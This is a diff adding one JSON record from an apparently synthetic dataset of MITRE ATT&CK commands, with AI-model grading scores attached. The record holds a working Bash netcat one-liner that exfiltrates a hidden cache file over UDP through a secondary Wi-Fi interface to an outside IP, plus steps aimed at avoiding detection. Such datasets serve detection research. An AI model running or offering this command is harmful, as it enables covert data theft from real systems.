@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && nc -u -w 2 -s \"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.5 49175 < /home/user/.cache/.tmp.bin",
+  "explanation": "Exfiltrates data via a secondary Wi\u2011Fi interface using UDP to an uncommon port, aligning with T1011 by using a network medium (wlan1) distinct from the primary channel. iwconfig is used for monitoring the interface before transmission.",
+  "rationale_steps": [
+    "Verify availability of the alternate Wi\u2011Fi interface with iwconfig (monitoring only).",
+    "Bind netcat to the wlan1 source IP to force traffic over the distinct Wi\u2011Fi medium.",
+    "Send the file over UDP to an uncommon port to reduce detection without changing system routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-4aaad84e",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting and substitutions, correct chaining and redirections, and standard flags for iwconfig, ip, awk, cut, and nc.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates the file over UDP via wlan1 by binding the source address from that interface, aligning with T1011, though iwconfig only checks presence/status and not connectivity and routing could still influence the actual egress path.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2025-10-01T01:27:12.841874Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags, and correct command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by checking for a secondary WiFi interface (wlan1), determining its IP address, and using netcat to exfiltrate data over UDP to a specific destination on an uncommon port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:27:15.300145Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, and correct command separators, ensuring it is parseable and executable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively utilizes a secondary Wi-Fi interface (wlan1) for UDP exfiltration of a local file to an uncommon port, precisely matching the T1011 technique and its operational description under specified privileges.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:31:26.345781Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
